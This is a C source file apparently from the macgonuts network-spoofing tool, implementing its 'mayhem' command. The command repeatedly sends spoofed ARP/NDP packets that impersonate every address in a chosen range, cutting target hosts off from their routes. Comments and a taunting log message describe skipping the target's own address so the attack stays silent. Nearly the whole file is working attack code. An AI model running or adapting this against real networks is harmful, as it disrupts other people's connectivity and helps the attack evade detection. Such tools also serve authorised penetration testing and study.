/*
 * Copyright (c) 2023, Rafael Santiago
 * All rights reserved.
 *
 * This source code is licensed under the BSD-style license found in the
 * LICENSE file in the root directory of this source tree.
 */
#include <cmd/macgonuts_mayhem_task.h>
#include <cmd/macgonuts_option.h>
#include <cmd/hooks/macgonuts_mayhem_init_hook.h>
#include <cmd/hooks/macgonuts_mayhem_deinit_hook.h>
#include <cmd/hooks/macgonuts_mayhem_done_hook.h>
#include <cmd/macgonuts_misc_utils.h>
#include <macgonuts_status_info.h>
#include <macgonuts_get_ethaddr.h>
#include <macgonuts_spoof.h>
#include <macgonuts_ipconv.h>
#include <macgonuts_socket.h>
#include <macgonuts_socket_common.h>
#include <macgonuts_thread.h>
#include <macgonuts_types.h>

#define MACGONUTS_SPFTD_NR 1

struct macgonuts_spoofing_guidance_ctx g_Spfgd[MACGONUTS_SPFTD_NR] = { 0 };

static int fill_up_tg_info(struct macgonuts_spoofing_guidance_ctx *spfgd);

static int fill_up_lo_info(struct macgonuts_spoofing_guidance_ctx *spfgd);

static int do_mayhem(void);

static int sched_mayhem_unicast(void);

static int sched_mayhem_range(void);

static void *mayhem_unicast_tdr(void *args);

static int should_exit(void);

static void sigint_watchdog(int signr);

struct mayhem_tgt_addr_ctx {
    uint8_t addr[2][16];
    size_t addr_nr; // INFO(Rafael): A size two means that it is about an unrolled CIDR (first, last address).
};

static struct mayhem_tgt_addr_ctx **parse_target_addr_list(const char **usr_data,
                                                           const size_t usr_data_nr, size_t *list_nr);

static void free_target_addr_list(struct mayhem_tgt_addr_ctx **list, const size_t list_nr);

int macgonuts_mayhem_task(void) {
    const char *lo_iface = NULL;
    const char *no_route_range = NULL;
    int err = EFAULT;
    size_t s;
    int ip_version = 0;
    char **target_addrs = NULL;
    size_t target_addrs_nr = 0;
    struct mayhem_tgt_addr_ctx **target_addr_list = NULL;
    size_t target_addr_list_nr = 0;
    const char *fake_pkts_amount = NULL;
    const char *timeout = NULL;

    lo_iface = macgonuts_get_option("lo-iface", NULL);
    if (lo_iface == NULL) {
        macgonuts_si_error("--lo-iface option is missing.\n");
        return EXIT_FAILURE;
    }

    no_route_range = macgonuts_get_option("no-route-range", NULL);
    if (no_route_range == NULL) {
        macgonuts_si_error("--no-route-range is missing.\n");
        return EXIT_FAILURE;
    }

    ip_version = macgonuts_get_cidr_version(no_route_range, strlen(no_route_range));

    if (ip_version == -1) {
        macgonuts_si_error("you gave me an invalid cidr in --no-route-range option.\n");
        return EXIT_FAILURE;
    }

    fake_pkts_amount = macgonuts_get_option("fake-pkts-amount", "1");
    if (!macgonuts_is_valid_number(fake_pkts_amount)) {
        macgonuts_si_error("--fake-pkts-amount option must be a valid integer.\n");
        return EXIT_FAILURE;
    }

    timeout = macgonuts_get_option("timeout", "0");
    if (!macgonuts_is_valid_number(timeout)) {
        macgonuts_si_error("--timeout option must be a valid integer.\n");
        return EXIT_FAILURE;
    }

    target_addrs = macgonuts_get_array_option("target-addrs", NULL, &target_addrs_nr);
    if (target_addrs == NULL) {
        macgonuts_si_error("--target-addrs is missing.\n");
        return EXIT_FAILURE;
    }
    target_addr_list = parse_target_addr_list((const char **)target_addrs, target_addrs_nr, &target_addr_list_nr);
    if (target_addr_list == NULL) {
        return EXIT_FAILURE;
    }

    macgonuts_free_array_option_value(target_addrs, target_addrs_nr);
    target_addrs_nr = 0;
    target_addrs = NULL;

    if (target_addr_list == NULL) {
        return EXIT_FAILURE;
    }

    err = EXIT_SUCCESS;

    for (s = 0; s < MACGONUTS_SPFTD_NR && err == EXIT_SUCCESS; s++) {
        g_Spfgd[s].usrinfo.lo_iface = lo_iface;
        g_Spfgd[s].layers.proto_addr_version = ip_version;
        g_Spfgd[s].layers.always_do_pktcraft = 1;
        err = fill_up_lo_info(&g_Spfgd[s]);
        if (err != EXIT_SUCCESS) {
            macgonuts_si_error("unable to fill up local information for spoofing task.\n");
            return EXIT_FAILURE;
        }
        g_Spfgd[s].handles.wire = macgonuts_create_socket(lo_iface, 1);
        if (g_Spfgd[s].handles.wire == -1) {
            err = EXIT_FAILURE;
            continue;
        }
        err = macgonuts_mutex_init(&g_Spfgd[s].handles.lock);
        if (err != EXIT_SUCCESS) {
            continue;
        }
        if (s == 0) {
            g_Spfgd[0].hooks.init = macgonuts_mayhem_init_hook;
            g_Spfgd[0].hooks.deinit = macgonuts_mayhem_deinit_hook;
            g_Spfgd[0].metainfo.arg[0] = target_addr_list;
            g_Spfgd[0].metainfo.arg[1] = &target_addr_list_nr;
            g_Spfgd[0].metainfo.arg[2] = (void *)no_route_range;
            g_Spfgd[0].spoofing.total = atoi(fake_pkts_amount);
            g_Spfgd[0].spoofing.timeout = atoi(timeout);
            g_Spfgd[0].layers.proto_addr_size = (ip_version == 4) ? 4 : 16;
        } else {
            g_Spfgd[s].spoofing.total = g_Spfgd[0].spoofing.total;
            g_Spfgd[s].spoofing.timeout = g_Spfgd[0].spoofing.timeout;
            g_Spfgd[s].layers.proto_addr_size = g_Spfgd[0].layers.proto_addr_size;
        }
        g_Spfgd[s].hooks.done = macgonuts_mayhem_done_hook;
    }

    if (err == EXIT_SUCCESS) {
        err = do_mayhem();
    }

    for (s = 0; s < MACGONUTS_SPFTD_NR; s++) {
        macgonuts_release_spoof_layers_ctx(&g_Spfgd[s].layers);
        if (g_Spfgd[s].handles.wire > -1) {
            macgonuts_release_socket(g_Spfgd[s].handles.wire);
        }
        macgonuts_mutex_destroy(&g_Spfgd[s].handles.lock);
    }

    free_target_addr_list(target_addr_list, target_addr_list_nr);

    return err;
}

int macgonuts_mayhem_task_help(void) {
    macgonuts_si_print("use: macgonuts mayhem --lo-iface=<label>\n"
                       "                      --no-route-range=<cidr4|cidr6>\n"
                       "                      --target-addrs=<ip4|ip6|cidr4|cidr6 list>\n"
                       "                     [--fake-pkts-amount=<n> --timeout=<ms>]\n");
    return EXIT_SUCCESS;
}

static int do_mayhem(void) {
    int err = EXIT_FAILURE;
    struct mayhem_tgt_addr_ctx **target_list = (struct mayhem_tgt_addr_ctx **)g_Spfgd[0].metainfo.arg[0];
    size_t *target_list_nr = (size_t *)g_Spfgd[0].metainfo.arg[1];
    const char *no_route_to = (const char *)g_Spfgd[0].metainfo.arg[2];
    struct mayhem_tgt_addr_ctx **tp = NULL;
    struct mayhem_tgt_addr_ctx **tp_end = NULL;
    size_t s;
    uint8_t no_route_to_1st[16] = { 0 };
    uint8_t no_route_to_2nd[16] = { 0 };

    assert(target_list != NULL && target_list_nr != NULL && no_route_to != NULL);

    if (macgonuts_get_raw_cidr(&no_route_to_1st[0], &no_route_to_2nd[0],
                               no_route_to, strlen(no_route_to)) != EXIT_SUCCESS) {
        macgonuts_si_error("invalid no-route-to.\n");
        return EXIT_FAILURE;
    }

    for (s = 0; s < MACGONUTS_SPFTD_NR; s++) {
        g_Spfgd[s].metainfo.arg[0] = &no_route_to_1st[0];
        g_Spfgd[s].metainfo.arg[1] = &no_route_to_2nd[0];
    }

    err = g_Spfgd[0].hooks.init(NULL, NULL, 0);
    if (err != EXIT_SUCCESS) {
        macgonuts_si_error("unable to enter in mayhem mode.\n");
        goto do_mayhem_epilogue;
    }

    signal(SIGINT, sigint_watchdog);
    signal(SIGTERM, sigint_watchdog);

    tp = target_list;
    tp_end = tp + *target_list_nr;

    while (!should_exit()) {
        for (s = 0; s < MACGONUTS_SPFTD_NR; s++) {
            g_Spfgd[s].metainfo.arg[2] = &(*tp)->addr;
        }
        switch ((*tp)->addr_nr) {
            case 1:
                err = sched_mayhem_unicast();
                break;

            case 2:
                err = sched_mayhem_range();
                break;

            default:
                // INFO(Rafael): It should never happen in normal conditions.
                break;
        }
        tp = ((tp + 1) == tp_end) ? target_list : tp + 1;
    }

do_mayhem_epilogue:

    err = g_Spfgd[0].hooks.deinit(NULL, NULL, 0);

    return err;
}

static int fill_up_tg_info(struct macgonuts_spoofing_guidance_ctx *spfgd) {
    size_t tg_address_size = strlen(spfgd->usrinfo.tg_address);
    int err = macgonuts_get_ethaddr(&spfgd->layers.tg_hw_addr[0],
                                    sizeof(spfgd->layers.tg_hw_addr),
                                    spfgd->usrinfo.tg_address, tg_address_size,
                                    spfgd->handles.wire, spfgd->usrinfo.lo_iface);

    if (err != EXIT_SUCCESS) {
        macgonuts_si_warn("unable to discover MAC address from `%s`, skipping it.\n", spfgd->usrinfo.tg_address);
        return err;
    }

    return macgonuts_get_raw_ip_addr(&spfgd->layers.tg_proto_addr[0],
                                     sizeof(spfgd->layers.tg_proto_addr),
                                     spfgd->usrinfo.tg_address,
                                     tg_address_size);
}

static int fill_up_lo_info(struct macgonuts_spoofing_guidance_ctx *spfgd) {
    char addr[256] = "";

    if (macgonuts_get_addr_from_iface(addr, sizeof(addr) - 1,
                                      spfgd->layers.proto_addr_version,
                                      spfgd->usrinfo.lo_iface) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    if (macgonuts_get_raw_ip_addr(&spfgd->layers.lo_proto_addr[0],
                                  sizeof(spfgd->layers.lo_proto_addr),
                                  addr, strlen(addr)) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    return macgonuts_get_gateway_hw_addr(&spfgd->layers.lo_hw_addr[0],
                                         sizeof(spfgd->layers.lo_hw_addr));
}

static int sched_mayhem_unicast(void) {
    macgonuts_thread_t td[MACGONUTS_SPFTD_NR];
    size_t t;
    int err = EXIT_SUCCESS;
    uint8_t curr_no_route_to[16] = { 0 };
    uint8_t end_no_route_to[16] = { 0 };
    size_t proto_addr_size = g_Spfgd[0].layers.proto_addr_size;
    char tg_address[MACGONUTS_SPFTD_NR][256];
    char spoof_address[MACGONUTS_SPFTD_NR][256];

    memcpy(&curr_no_route_to[0], (uint8_t *)g_Spfgd[0].metainfo.arg[0], proto_addr_size);
    memcpy(&end_no_route_to[0], (uint8_t *)g_Spfgd[0].metainfo.arg[1], proto_addr_size);
    macgonuts_inc_raw_ip(end_no_route_to, proto_addr_size);


    for (t = 0; t < MACGONUTS_SPFTD_NR; t++) {
        err = macgonuts_raw_ip2literal(tg_address[t], sizeof(tg_address[t]),
                                       ((uint8_t **)&g_Spfgd[0].metainfo.arg[2])[0],
                                        proto_addr_size);
        if (err != EXIT_SUCCESS) {
            macgonuts_si_error("unable to convert target ip address.\n");
            return EXIT_FAILURE;
        }
        g_Spfgd[t].usrinfo.tg_address = tg_address[t];
        err = fill_up_tg_info(&g_Spfgd[t]);
        if (err != EXIT_SUCCESS) {
            macgonuts_si_warn("unable to fill up target's basic spoofing information.\n");
            return EXIT_FAILURE;
        }
    }

    while (memcmp(curr_no_route_to, end_no_route_to, proto_addr_size) != 0 && !should_exit()) {
        t = 0;
        do {
            if (memcmp(curr_no_route_to, g_Spfgd[t].layers.tg_proto_addr, proto_addr_size) == 0) {
                // INFO(Rafael): Since some network stacks implementations have the ability of
                //               warning user when there is another host using the same mac address
                //               of her/him we will avoid spoofing the target address to keep the
                //               attack more silent possible.
                macgonuts_inc_raw_ip(curr_no_route_to, proto_addr_size);
                macgonuts_si_warn("`%s` (a.k.a \"the target\") was skipped thus we do not warn up it "
                                  "about the attack MuHauHauhAuHAuAHuaH!\n",
                                  tg_address[t]);
                continue;
            }
            memcpy(&g_Spfgd[t].layers.spoof_proto_addr[0],
                   &curr_no_route_to[0], proto_addr_size);
            err = macgonuts_raw_ip2literal(spoof_address[t], sizeof(spoof_address[t]),
                                           &g_Spfgd[t].layers.spoof_proto_addr[0],
                                           proto_addr_size);
            if (err != EXIT_SUCCESS) {
                macgonuts_si_warn("unable to convert spoof ip address.\n");
                t++;
                continue;
            }
            g_Spfgd[t].usrinfo.spoof_address = spoof_address[t];
            if (macgonuts_create_thread(&td[t], mayhem_unicast_tdr, &g_Spfgd[t]) != EXIT_SUCCESS) {
                macgonuts_si_warn("unable to create spoofing thread.\n");
            }
            t++;
            macgonuts_inc_raw_ip(curr_no_route_to, proto_addr_size);
        } while (t < MACGONUTS_SPFTD_NR && memcmp(curr_no_route_to, end_no_route_to, proto_addr_size) != 0);

        for (t = 0; t < MACGONUTS_SPFTD_NR; t++) {
            macgonuts_thread_join(&td[t], NULL);
        }
    }

    return err;
}

static int sched_mayhem_range(void) {
    uint8_t curr_tg_addr[16] = { 0 };
    uint8_t end_tg_addr[16] = { 0 };
    size_t proto_addr_size = g_Spfgd[0].layers.proto_addr_size;
    int err = EXIT_SUCCESS;
    uint8_t addr[2][16] = { 0 };

    memcpy(&curr_tg_addr[0], ((uint8_t **)g_Spfgd[0].metainfo.arg[2])[0], proto_addr_size);
    memcpy(&end_tg_addr[0], ((uint8_t **)g_Spfgd[0].metainfo.arg[2])[1], proto_addr_size);
    macgonuts_inc_raw_ip(end_tg_addr, proto_addr_size);

    while (memcmp(curr_tg_addr, end_tg_addr, proto_addr_size) != 0
           && err == EXIT_SUCCESS && !should_exit()) {
        memcpy(&addr[0][0], &curr_tg_addr[0], proto_addr_size);
        err = sched_mayhem_unicast();
        macgonuts_inc_raw_ip(curr_tg_addr, proto_addr_size);
    }

    return err;
}

static void *mayhem_unicast_tdr(void *args) {
    struct macgonuts_spoofing_guidance_ctx *spfgd = (struct macgonuts_spoofing_guidance_ctx *)args;
    int err = macgonuts_get_raw_ip_addr(&spfgd->layers.tg_proto_addr[0],
                                        spfgd->layers.proto_addr_size,
                                        spfgd->usrinfo.tg_address,
                                        strlen(spfgd->usrinfo.tg_address));
    size_t t;
    size_t success_nr = 0;

    if (err != EXIT_SUCCESS) {
        macgonuts_si_warn("unable to convert target address.\n");
        return NULL;
    }

    for (t = 0; t < spfgd->spoofing.total && !should_exit(); t++) {
        err = macgonuts_spoof(spfgd->handles.wire, &spfgd->layers);
        if (err != EXIT_SUCCESS) {
            macgonuts_si_warn("unable to send spoofing packet.\n");
            continue;
        }
        success_nr += (err == EXIT_SUCCESS);
        if (spfgd->spoofing.timeout > 0) {
            usleep(spfgd->spoofing.timeout * 1000);
        }
    }

    if (success_nr > 0) {
        spfgd->hooks.done(spfgd, NULL, 0);
    } else {
        macgonuts_si_error("any spoofing packet related to `%s` could be send to `%s`.\n", spfgd->usrinfo.spoof_address,
                                                                                           spfgd->usrinfo.tg_address);
    }

    return NULL;
}

static struct mayhem_tgt_addr_ctx **parse_target_addr_list(const char **usr_data,
                                                           const size_t usr_data_nr, size_t *list_nr) {
    const char **usr_data_item = usr_data;
    const char **usr_data_end = usr_data + usr_data_nr;
    size_t usr_data_item_size = 0;
    struct mayhem_tgt_addr_ctx **list = NULL, **lp = NULL;
    int err = EXIT_SUCCESS;

    *list_nr = 0;
    list = (struct mayhem_tgt_addr_ctx **)malloc(sizeof(struct mayhem_tgt_addr_ctx **) * usr_data_nr);
    if (list == NULL) {
        macgonuts_si_error("unable to allocate memory to parse target list.\n");
        return NULL;
    }
    memset(list, 0, sizeof(struct mayhem_tgt_addr_ctx **) * usr_data_nr);
    *list_nr = usr_data_nr;
    lp = list;

    while (usr_data_item != usr_data_end && err == EXIT_SUCCESS) {
        (*lp) = (struct mayhem_tgt_addr_ctx *)malloc(sizeof(struct mayhem_tgt_addr_ctx));
        if ((*lp) == NULL) {
            macgonuts_si_error("unable to allocate memory to parse target list item.\n");
            err = EXIT_FAILURE;
            continue;
        }
        usr_data_item_size = strlen(*usr_data_item);
        if (macgonuts_check_ip_addr(*usr_data_item, usr_data_item_size)) {
            err = macgonuts_get_raw_ip_addr(&(*lp)->addr[0][0], sizeof((*lp)->addr),
                                            *usr_data_item, usr_data_item_size);
            (*lp)->addr_nr = 1;
        } else if (macgonuts_check_ip_cidr(*usr_data_item, usr_data_item_size)) {
            err = macgonuts_get_raw_cidr(&(*lp)->addr[0][0], &(*lp)->addr[1][0],
                                         *usr_data_item, usr_data_item_size);
            (*lp)->addr_nr = 2;
        } else {
            macgonuts_si_error("`%s` is not a valid ip address or cidr.\n", *usr_data_item);
            err = EXIT_FAILURE;
        }
        usr_data_item++;
        lp++;
    }

    if (err != EXIT_SUCCESS && list != NULL) {
        free_target_addr_list(list, *list_nr);
        list = NULL;
        *list_nr = 0;
    }
    return list;
}

static void free_target_addr_list(struct mayhem_tgt_addr_ctx **list, const size_t list_nr) {
    struct mayhem_tgt_addr_ctx **lp = list;
    struct mayhem_tgt_addr_ctx **lp_end = lp + list_nr;
    while (lp != lp_end) {
        if ((*lp) != NULL) {
            free((*lp));
        }
        lp++;
    }
    free(list);
}

static int should_exit(void) {
    size_t s = 0;
    int err = EXIT_SUCCESS;
    int do_exit = 0;

    for (s = 0; s < MACGONUTS_SPFTD_NR && err == EXIT_SUCCESS; s++) {
        err = macgonuts_mutex_lock(&g_Spfgd[s].handles.lock);
        if (err != EXIT_SUCCESS) {
            macgonuts_si_error("while trying to acquire spoofing guidance context lock.\n");
        }
    }

    if (err != EXIT_SUCCESS) {
        goto should_exit_epilogue;
    }

    for (s = 0; s < MACGONUTS_SPFTD_NR && !do_exit; s++) {
        do_exit = g_Spfgd[s].spoofing.abort;
    }

    if (do_exit) {
        for (s = 0; s < MACGONUTS_SPFTD_NR; s++) {
            g_Spfgd[s].spoofing.abort = 1;
        }
    }

should_exit_epilogue:

    for (s = 0; s < MACGONUTS_SPFTD_NR; s++) {
        macgonuts_mutex_unlock(&g_Spfgd[s].handles.lock);
    }

    return do_exit;
}

static void sigint_watchdog(int signr) {
    if (macgonuts_mutex_lock(&g_Spfgd[0].handles.lock) != EXIT_SUCCESS) {
        return;
    }
    g_Spfgd[0].spoofing.abort = 1;
    macgonuts_mutex_unlock(&g_Spfgd[0].handles.lock);
}
